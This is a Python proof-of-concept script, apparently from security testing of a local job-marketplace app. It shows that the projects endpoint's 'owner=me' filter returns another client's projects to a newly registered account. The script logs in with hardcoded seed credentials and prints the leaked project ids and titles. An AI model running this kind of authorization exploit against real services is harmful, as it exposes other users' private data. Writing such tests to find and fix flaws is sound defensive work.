"""
WSTG-ATHZ-04: Owner-scoped project listing leaks another user's projects.

Demonstrates that GET /api/projects?owner=me returns projects belonging to the
seed client account even when called by an unrelated freshly registered user.

Expected:
- The new account is created successfully
- The owner=me request returns at least one project
- The first returned project's client_id matches the victim client, not the attacker
"""

from __future__ import annotations

import time
import uuid

import requests


BASE = "http://localhost:3000"
PASSWORD = "password123"


def register_client() -> dict:
    stamp = f"{int(time.time())}_{uuid.uuid4().hex[:8]}"
    email = f"wstg_athz04_{stamp}@proton.test"
    username = f"wstg_athz04_{uuid.uuid4().hex[:10]}"
    resp = requests.post(
        f"{BASE}/api/auth/register",
        json={
            "email": email,
            "password": PASSWORD,
            "username": username,
            "display_name": "WSTG ATHZ04",
        },
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()


def login_seed_client() -> dict:
    resp = requests.post(
        f"{BASE}/api/auth/login",
        json={"email": "testclient@hireflow.com", "password": PASSWORD},
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()


def main() -> None:
    victim = login_seed_client()
    victim_id = victim["user"]["id"]
    print(f"[+] Victim client id: {victim_id}")

    attacker = register_client()
    attacker_id = attacker["user"]["id"]
    attacker_token = attacker["token"]
    print(f"[+] Registered unrelated attacker account: {attacker['user']['email']}")
    print(f"[+] Attacker id: {attacker_id}")

    leak = requests.get(
        f"{BASE}/api/projects",
        params={"owner": "me", "status": "active", "limit": 2},
        headers={"Authorization": f"Bearer {attacker_token}"},
        timeout=10,
    )
    leak.raise_for_status()
    body = leak.json()
    projects = body.get("data", [])
    assert projects, "Expected at least one leaked project"

    first = projects[0]
    print(f"[+] First leaked project id: {first.get('id')}")
    print(f"[+] First leaked project client_id: {first.get('client_id')}")
    print(f"[+] First leaked project title: {first.get('title')}")

    assert first.get("client_id") == victim_id, "Expected leaked project to belong to victim client"
    assert first.get("client_id") != attacker_id, "Expected owner=me not to resolve to attacker"

    print("\n[VULNERABLE] owner=me leaks another user's projects")


if __name__ == "__main__":
    main()
